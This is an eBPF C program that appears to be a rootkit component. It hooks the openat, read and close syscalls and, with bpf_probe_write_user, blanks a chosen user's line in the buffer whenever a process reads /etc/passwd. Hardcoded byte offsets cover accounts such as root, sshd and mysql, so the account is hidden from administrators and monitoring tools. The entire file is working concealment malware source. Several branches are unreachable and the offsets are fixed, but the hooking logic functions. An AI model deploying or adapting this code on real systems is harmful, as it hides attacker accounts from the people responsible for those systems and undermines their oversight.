// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

#define MAX_PAYLOAD_LEN 100
#define MAX_USERNAME_LEN 20
const int max_payload_len = 64;
const volatile int username_len = 0;
const volatile char username[MAX_PAYLOAD_LEN];

// Const length of string "cat"
#define USER_LEN 4

// Const length of string "/etc/passwd"
#define PASSWD_LEN 12

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;

    // Check if we're a process thread of interest
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // check comm is cat
    /*
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const char *user = "cat";
    for (int i = 0; i < USER_LEN; i++) {
        if (comm[i] != user[i]) {
            //return 0;
        }
    }*/

    // Now check we're opening /etc/passwd
    const char *passwd = "/etc/passwd";
    char filename[PASSWD_LEN];
    bpf_probe_read_user(&filename, PASSWD_LEN, (char*)ctx->args[1]);
    for (int i = 0; i < PASSWD_LEN; i++) {
        if (filename[i] != passwd[i]) {
            return 0;
        }
    }
    bpf_printk("Hiding user %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

long fuckbpf(long unsigned int buff_addr){
    char local_buff[MAX_PAYLOAD_LEN] = { '\0' };
    long ret;
    for(int i = 0; i < MAX_PAYLOAD_LEN; i++){
        local_buff[i] = '\0';
    }
    if (username[0] == 'r' && username[1] == 'o' && username[2] == 'o' && username[3] == 't') {
    ret = bpf_probe_write_user((void*)(buff_addr + 0), local_buff, 31);
    }
    else if (username[0] == 'd' && username[1] == 'a' && username[2] == 'e' && username[3] == 'm' && username[4] == 'o' && username[5] == 'n') {
        ret = bpf_probe_write_user((void*)(buff_addr + 31), local_buff, 48);
    }
    else if (username[0] == 'b' && username[1] == 'i' && username[2] == 'n') {
        ret = bpf_probe_write_user((void*)(buff_addr + 79), local_buff, 37);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's') {
        ret = bpf_probe_write_user((void*)(buff_addr + 116), local_buff, 37);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm') {
        ret = bpf_probe_write_user((void*)(buff_addr + 153), local_buff, 39);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd') {
        ret = bpf_probe_write_user((void*)(buff_addr + 192), local_buff, 40);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 'n' && username[3] == 'c') {
        ret = bpf_probe_write_user((void*)(buff_addr + 153), local_buff, 35);
    }
    else if (username[0] == 'g' && username[1] == 'a' && username[2] == 'm' && username[3] == 'e' && username[4] == 's') {
        ret = bpf_probe_write_user((void*)(buff_addr + 188), local_buff, 48);
    }
    else if (username[0] == 'm' && username[1] == 'a' && username[2] == 'n') {
        ret = bpf_probe_write_user((void*)(buff_addr + 236), local_buff, 48);
    }
    else if (username[0] == 'l' && username[1] == 'p') {
        ret = bpf_probe_write_user((void*)(buff_addr + 284), local_buff, 45);
    }
    else if (username[0] == 'm' && username[1] == 'a' && username[2] == 'i' && username[3] == 'l') {
        ret = bpf_probe_write_user((void*)(buff_addr + 329), local_buff, 44);
    }
    else if (username[0] == 'n' && username[1] == 'e' && username[2] == 'w' && username[3] == 's') {
        ret = bpf_probe_write_user((void*)(buff_addr + 373), local_buff, 50);
    }
    else if (username[0] == 'u' && username[1] == 'u' && username[2] == 'c' && username[3] == 'p') {
        ret = bpf_probe_write_user((void*)(buff_addr + 423), local_buff, 52);
    }
    else if (username[0] == 'p' && username[1] == 'r' && username[2] == 'o' && username[3] == 'x' && username[4] == 'y') {
        ret = bpf_probe_write_user((void*)(buff_addr + 475), local_buff, 43);
    }
    else if (username[0] == 'w' && username[1] == 'w' && username[2] == 'w' && username[3] == '-' && username[4] == 'd' && username[5] == 'a' && username[6] == 't' && username[7] == 'a') {
        ret = bpf_probe_write_user((void*)(buff_addr + 518), local_buff, 53);
    }
    else if (username[0] == 'b' && username[1] == 'a' && username[2] == 'c' && username[3] == 'k' && username[4] == 'u' && username[5] == 'p') {
        ret = bpf_probe_write_user((void*)(buff_addr + 571), local_buff, 53);
    }
    else if (username[0] == 'l' && username[1] == 'i' && username[2] == 's' && username[3] == 't') {    
    ret = bpf_probe_write_user((void*)(buff_addr + 624), local_buff, 62);
    }
    else if (username[0] == 'i' && username[1] == 'r' && username[2] == 'c') {  
    ret = bpf_probe_write_user((void*)(buff_addr + 686), local_buff, 45);
    }
    else if (username[0] == 'g' && username[1] == 'n' && username[2] == 'a' && username[3] == 't' && username[4] == 's') {  
    ret = bpf_probe_write_user((void*)(buff_addr + 731), local_buff, 82);
    }
    else if (username[0] == 'n' && username[1] == 'o' && username[2] == 'b' && username[3] == 'o' && username[4] == 'd' && username[5] == 'y') {    
    ret = bpf_probe_write_user((void*)(buff_addr + 813), local_buff, 59);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 'n' && username[9] == 'e' && username[10] == 't' && username[11] == 'w' && username[12] == 'o' && username[13] == 'r' && username[14] == 'k') {
        ret = bpf_probe_write_user((void*)(buff_addr + 872), local_buff, 87);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 'r' && username[9] == 'e' && username[10] == 's' && username[11] == 'o' && username[12] == 'l' && username[13] == 'v' && username[14] == 'e') {
        ret = bpf_probe_write_user((void*)(buff_addr + 959), local_buff, 77);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 't' && username[4] == 'e' && username[5] == 'm' && username[6] == 'd' && username[7] == '-' && username[8] == 't' && username[9] == 'i' && username[10] == 'm' && username[11] == 'e' && username[12] == 's' && username[13] == 'y' && username[14] == 'n' && username[15] == 'c') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1036), local_buff, 90);
    }
    else if (username[0] == 'm' && username[1] == 'e' && username[2] == 's' && username[3] == 's' && username[4] == 'a' && username[5] == 'g' && username[6] == 'e' && username[7] == 'b' && username[8] == 'u' && username[9] == 's') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1126), local_buff, 53);
    }
    else if (username[0] == 's' && username[1] == 'y' && username[2] == 's' && username[3] == 'l' && username[4] == 'o' && username[5] == 'g') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1179), local_buff, 49);
    }
    else if (username[0] == '_' && username[1] == 'a' && username[2] == 'p' && username[3] == 't') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1228), local_buff, 49);
    }
    else if (username[0] == 't' && username[1] == 's' && username[2] == 's') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1277), local_buff, 60);
    }
    else if (username[0] == 'u' && username[1] == 'u' && username[2] == 'i' && username[3] == 'd' && username[4] == 'd') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1337), local_buff, 46);
    }
    else if (username[0] == 't' && username[1] == 'c' && username[2] == 'p' && username[3] == 'd' && username[4] == 'u' && username[5] == 'm' && username[6] == 'p') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1383), local_buff, 50);
    }
    else if (username[0] == 's' && username[1] == 's' && username[2] == 'h' && username[3] == 'd') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1433), local_buff, 46);
    }
    else if (username[0] == 'l' && username[1] == 'a' && username[2] == 'n' && username[3] == 'd' && username[4] == 's' && username[5] == 'c' && username[6] == 'a' && username[7] == 'p' && username[8] == 'e') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1479), local_buff, 58);
    }
    else if (username[0] == 'p' && username[1] == 'o' && username[2] == 'l' && username[3] == 'l' && username[4] == 'i' && username[5] == 'n' && username[6] == 'a' && username[7] == 't' && username[8] == 'e') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1537), local_buff, 51);
    }
    else if (username[0] == 's' && username[1] == 'u' && username[2] == 'm' && username[3] == 'm' && username[4] == 'i' && username[5] == 't' && username[6] == 's' && username[7] == 'o' && username[8] == 'u' && username[9] == 'l') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1588), local_buff, 53);
    }
    else if (username[0] == 'd' && username[1] == 'n' && username[2] == 's' && username[3] == 'm' && username[4] == 'a' && username[5] == 's' && username[6] == 'q') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1641), local_buff, 63);
    }
    else if (username[0] == 'f' && username[1] == 'w' && username[2] == 'u' && username[3] == 'p' && username[4] == 'd' && username[5] == '-' && username[6] == 'r' && username[7] == 'e' && username[8] == 'f' && username[9] == 'r' && username[10] == 'e' && username[11] == 's' && username[12] == 'h') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1704), local_buff, 77);
    }
    else if (username[0] == 'm' && username[1] == 'e' && username[2] == 'm' && username[3] == 'c' && username[4] == 'a' && username[5] == 'c' && username[6] == 'h' && username[7] == 'e') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1781), local_buff, 56);
    }
    else if (username[0] == 'm' && username[1] == 'y' && username[2] == 's' && username[3] == 'q' && username[4] == 'l') {
        ret = bpf_probe_write_user((void*)(buff_addr + 1837), local_buff, 56);
    }
    return ret;
}

static __always_inline long process_one_chunk(long unsigned int buff_addr, int num, long remain) {
    int curr_len = remain > max_payload_len ? max_payload_len : remain;
    int match = 1;
    char k;
    long ret = 0;

    #pragma unroll
    for (int i = 0; i < 5; i++) {
        if (i >= curr_len) break;
        // 滑动窗口匹配
        match = 1;
        #pragma unroll
        for (int j = 0; j < MAX_USERNAME_LEN; j++) {
            if (j >= username_len) break;
            char c = 0;
            bpf_probe_read(&c, 1, (void*)(buff_addr + num * max_payload_len + i + j));
            if (c != username[j]) {
                match = 0;
                break;
            }
        }
        if (match) {
            // 匹配到就清空这一行
            for (int j = 0; ; j++) {
                bpf_probe_read(&k, 1, (void*)(buff_addr + num * max_payload_len + i + j));
                char c = '\0';
                ret = bpf_probe_write_user((void*)(buff_addr + num * max_payload_len + i + j), &c, 1);
                if (k == '\n') break;
            }
            break;
        }
    }
    return ret;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;

    // Add our payload to the first line
    if (read_size < username_len) {
        return 0;
    }


    long remain = read_size;
    // delete username row
    //char buf[MAX_PAYLOAD_LEN] = { 0x00 };
    //char window[MAX_USERNAME_LEN] = { 0x00 };

    int num = 0, match = 1;
    char k;
    //long ret = 0;

    long ret = fuckbpf(buff_addr);

    /*
    while (remain > 0) {
        ret = process_one_chunk(buff_addr, num, remain);
        num++;
        remain -= MAX_PAYLOAD_LEN;
    }*/

    

    /*
    while(remain > 0){
        int curr_len = remain > max_payload_len ? max_payload_len : remain;
        bpf_probe_read(buf, curr_len, (void*)(buff_addr + num * max_payload_len));
        
        for(int i = 0; i < curr_len; i++){
            // username
            bpf_probe_read(window, username_len, (void*)(buff_addr + num * max_payload_len + i));

            for(int j = 0; j < username_len; j++){
                if(window[j] != username[j]){
                    match = 0;
                    break;
                }
            }

            if(match){
                for(int j = 0; ; j++){
                    bpf_probe_read(&k, 1, (void*)(buff_addr + num * max_payload_len + i + j));
                    char c = '\0';
                    ret = bpf_probe_write_user((void*)(buff_addr + num * max_payload_len + i + j), &c, 1);
                    if(k == '\n'){
                        break;
                    }
                }
                break;
            }
        }

        match = 1;
        num++;
        remain -= MAX_PAYLOAD_LEN;
    }*/

    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    
    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}